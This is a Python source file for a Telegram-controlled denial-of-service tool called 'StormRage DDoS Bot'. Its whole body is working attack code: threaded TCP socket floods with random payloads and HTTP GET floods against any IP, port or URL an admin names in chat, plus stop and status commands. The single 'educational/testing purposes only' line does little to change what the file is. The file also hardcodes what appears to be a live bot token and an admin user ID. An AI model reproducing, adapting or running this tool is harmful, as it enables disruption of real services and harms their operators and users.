import socket
import threading
import requests
import random
import time
import os
import asyncio
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== TELEGRAM BOT TOKEN ====================
# CHANGE THIS TO YOUR BOT TOKEN FROM @BotFather
BOT_TOKEN = "8957381735:AAEbDCbmmzvT1aDUBdUOjDAHZdbi5OQpxxQ"

# Admin user IDs (your Telegram user ID)
ADMIN_IDS = [7898928200]  # Get from @userinfobot

# Store active attacks
active_attacks = {}

# ==================== ORIGINAL DDOS FUNCTIONS ====================
# Function to clear the terminal screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# TCP flood function
def tcp_flood(ip, port, chat_id):
    while active_attacks.get(chat_id, False):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            data = random._urandom(1024)
            sock.send(data)
            sock.close()
            print(f"\033[92m[TCP] Packet sent to {ip}:{port}")
        except:
            print(f"\033[91m[TCP] Failed to send packet to {ip}:{port}")

# HTTPS flood function
def https_flood(url, chat_id):
    while active_attacks.get(chat_id, False):
        try:
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0',
                    'Chrome/91.0',
                    'Safari/537.36',
                    'Opera/9.80'
                ])
            }
            response = requests.get(url, headers=headers)
            print(f"\033[92m[HTTPS] Request sent to {url} | Status: {response.status_code}")
        except:
            print(f"\033[91m[HTTPS] Failed to send request to {url}")

# ==================== TELEGRAM COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized. You are not admin.")
        return
    
    await update.message.reply_text(
        "🔥 *StormRage DDoS Bot Activated* 🔥\n\n"
        "Commands:\n"
        "/attack_tcp <IP> <PORT> <THREADS> - Start TCP attack\n"
        "/attack_http <URL> <THREADS> - Start HTTP attack\n"
        "/stop - Stop current attack\n"
        "/status - Check attack status\n"
        "/help - Show this menu\n\n"
        "⚠️ For educational/testing purposes only!",
        parse_mode='Markdown'
    )

async def attack_tcp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    try:
        ip = context.args[0]
        port = int(context.args[1])
        threads = int(context.args[2])
    except:
        await update.message.reply_text("⚠️ Usage: /attack_tcp <IP> <PORT> <THREADS>\nExample: /attack_tcp 192.168.1.1 80 500")
        return
    
    chat_id = update.effective_chat.id
    
    # Stop any existing attack
    if chat_id in active_attacks:
        active_attacks[chat_id] = False
        time.sleep(1)
    
    active_attacks[chat_id] = True
    
    await update.message.reply_text(
        f"🔥 *TCP Attack Started!*\n"
        f"Target: {ip}:{port}\n"
        f"Threads: {threads}\n"
        f"Status: Sending packets...",
        parse_mode='Markdown'
    )
    
    for _ in range(threads):
        thread = threading.Thread(target=tcp_flood, args=(ip, port, chat_id))
        thread.daemon = True
        thread.start()
    
    # Send live stats
    while active_attacks.get(chat_id, False):
        await asyncio.sleep(10)
        await update.message.reply_text(f"💀 Attack still running on {ip}:{port}")

async def attack_http(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    try:
        url = context.args[0]
        threads = int(context.args[1])
    except:
        await update.message.reply_text("⚠️ Usage: /attack_http <URL> <THREADS>\nExample: /attack_http https://example.com 500")
        return
    
    chat_id = update.effective_chat.id
    
    # Stop any existing attack
    if chat_id in active_attacks:
        active_attacks[chat_id] = False
        time.sleep(1)
    
    active_attacks[chat_id] = True
    
    await update.message.reply_text(
        f"🔥 *HTTP Attack Started!*\n"
        f"Target: {url}\n"
        f"Threads: {threads}\n"
        f"Status: Sending requests...",
        parse_mode='Markdown'
    )
    
    for _ in range(threads):
        thread = threading.Thread(target=https_flood, args=(url, chat_id))
        thread.daemon = True
        thread.start()
    
    # Send live stats
    while active_attacks.get(chat_id, False):
        await asyncio.sleep(10)
        await update.message.reply_text(f"💀 HTTP flood still running on {url}")

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    chat_id = update.effective_chat.id
    if chat_id in active_attacks:
        active_attacks[chat_id] = False
        await update.message.reply_text("🛑 Attack stopped successfully!")
    else:
        await update.message.reply_text("⚠️ No active attack to stop.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    chat_id = update.effective_chat.id
    if chat_id in active_attacks and active_attacks[chat_id]:
        await update.message.reply_text("💀 Attack is currently RUNNING")
    else:
        await update.message.reply_text("✅ No active attack")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ==================== MAIN ====================
def main():
    # Create bot application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack_tcp", attack_tcp))
    app.add_handler(CommandHandler("attack_http", attack_http))
    app.add_handler(CommandHandler("stop", stop_attack))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))
    
    print("🤖 StormRage Bot Started! Press Ctrl+C to stop.")
    print(f"Bot running at: https://t.me/@{app.bot.username}" if app.bot.username else "Bot running")
    
    # Start the bot
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()